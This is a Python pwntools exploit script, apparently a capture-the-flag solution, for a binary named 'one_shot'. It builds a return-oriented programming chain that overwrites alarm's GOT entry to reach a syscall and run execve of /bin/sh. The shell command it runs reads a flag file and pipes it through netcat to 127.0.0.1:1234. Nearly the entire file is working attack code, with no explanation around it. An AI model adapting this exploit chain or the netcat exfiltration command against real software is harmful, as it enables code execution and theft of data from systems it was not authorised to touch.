#!/usr/bin/env python
from pwn import *

conn = process("./one_shot")

check = 0x8a919ff0

alarm_plt = 0x400520 
alarm_got = 0x601020
puts_plt = 0x400510

mov_eax = 0x004006f7 # mov eax, dword [rbp-0x0C] ; pop rbx ; pop rbp ; ret  ;  (1 found)
copy_rdi2rsi = 0x400684 # copies eax bytes from rdi to rsi
						# [rbp-0x20] and [rbp-0x1C] need to be equal (or null)

pop_rbp = 0x00400774 # pop rbp ; ret
pop_rdi = 0x00400843 # pop rdi ; ret  ;  (1 found)
pop_rsi_r15 = 0x400841 # pop rsi ; pop r15 ; ret

len_addr = 0x40070e # contains 0x234
trash_rbp = 0x601100 # random writable addr in a nulled area
copy_buffer_addr = 0x601600 # where our copied buffer will be

cmd = "cat /home/sherlock/flag | nc 127.0.0.1 1234"

### check pass
payload =  p32(check) 
# execve("/bin/sh", )
payload += "/bin/sh\x00"
payload += "-c\x00"
payload += cmd
payload += "\x00"*10

#argv_address
argv_addr = copy_buffer_addr + len(payload)-4

# argv = ["/bin/sh", "-c", cmd, 0]
payload += p64(copy_buffer_addr) 	# "/bin/sh"
payload += p64(copy_buffer_addr+8) 	# "-c"
payload += p64(copy_buffer_addr+11) # cmd
payload += p64(0)					# NULL

# execve syscall num
execve_syscall_num_addr = copy_buffer_addr + len(payload)-4
payload += p64(59)
payload += "\x00"*(0x80-len(payload))

# now buffer is end and copy buffer
payload += p64(len_addr+0xc) # [rbp-0xc] is 0x234
payload += p64(mov_eax)  	 # eax = 0x234
payload += p64(0xdeadbeef)   # rbx
payload += p64(trash_rbp)   # rbp

payload += p64(pop_rsi_r15)	 # set rsi to new_buffer_address
payload += p64(copy_buffer_addr)
payload += p64(0xdeadbeef) 	 # r15
payload += p64(copy_rdi2rsi)
payload += p64(0xdeadbeef)  # rbx
payload += p64(trash_rbp)	# rbp

# make alarm call to syscall
# now rax value is 1
payload += p64(pop_rdi)	 # set rdi to (alarm+5) 1byte value   <alarm+5>:	syscall
payload += p64(0x4005e3) # contains byte 0xe5 
payload += p64(pop_rsi_r15)	 # set rsi to new_buffer_address
payload += p64(alarm_got)
payload += p64(0xdeadbeef) 	 # r15
payload += p64(copy_rdi2rsi)
payload += p64(0xdeadbeef)  # rbx
payload += p64(trash_rbp)	# rbp

# now alarm call is syscall
# call execve!
payload += p64(pop_rbp)	 
payload += p64(execve_syscall_num_addr + 0xc)
payload += p64(mov_eax)	 # eax = 59
payload += p64(0xdeadbeef)   # rbx
payload += p64(trash_rbp)   # rbp

payload += p64(pop_rbp)	 
payload += p64(execve_syscall_num_addr + 0xc)
payload += p64(mov_eax)	 # eax = 59
payload += p64(0)   # rbx
payload += p64(trash_rbp)   # rbp

pop_r12_15 = 0x40083c   # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
register_set_and_call_func   = 0x400820	# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8] ;  (1 found)

#set 
payload += p64(pop_r12_15)
payload += p64(alarm_got)	# syscall set! r12=syscall_address & rbx=0 -> call qword [r12+rbx*8]
payload += p64(0)			# r13 -> rdx = 0
payload += p64(argv_addr)	# r14 -> rsi = argv_addr
payload += p64(copy_buffer_addr)	# r15 -> rdi = "/bin/sh\x00"
payload += p64(register_set_and_call_func)

log.info("payload_len : %x <= 0x234" % len(payload))

conn.send(payload)
conn.interactive()